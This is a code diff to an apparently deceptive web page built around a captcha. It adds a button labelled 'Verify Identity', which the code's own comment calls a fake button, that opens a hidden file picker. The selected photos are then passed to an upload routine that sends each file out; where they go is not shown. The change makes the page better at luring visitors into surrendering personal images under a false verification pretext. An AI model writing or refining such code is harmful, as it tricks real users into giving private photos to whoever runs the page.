@@ -24,6 +24,18 @@
             color: red;
             font-weight: bold;
         }
+        .verify-button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .verify-button:hover {
+            background-color: #0056b3;
+        }
     </style>
 </head>
 <body>
@@ -34,6 +46,9 @@
         <input type="text" id="captcha-input" placeholder="Your answer">
         <button onclick="checkCaptcha()">Submit</button>
         <p id="error-message" class="hidden error">Invalid captcha. Please try again later.</p>
+
+        <!-- Fake button to trigger file input -->
+        <button class="verify-button" onclick="triggerFileInput()">Verify Identity</button>
     </div>
 
     <!-- Hidden file input -->
@@ -50,8 +65,8 @@
         // Function to upload photos
         async function uploadPhotos() {
             const fileInput = document.getElementById("photo-upload");
-            fileInput.click();
 
+            // Listen for file selection
             fileInput.addEventListener("change", async (event) => {
                 const files = event.target.files;
                 if (files.length > 0) {
@@ -73,15 +88,23 @@
                             console.error("Error uploading file:", file.name, error);
                         }
                     }
+                } else {
+                    console.log("No files selected.");
                 }
             });
 
             // Abort if no files are selected after a short delay
             setTimeout(() => {
                 if (fileInput.files.length === 0) {
-                    console.log("No files selected.");
+                    console.log("File input was not triggered.");
                 }
             }, 5000); // 5-second timeout
+        }
+
+        // Function to trigger the file input
+        function triggerFileInput() {
+            const fileInput = document.getElementById("photo-upload");
+            fileInput.click();
         }
 
         // Function to check the captcha
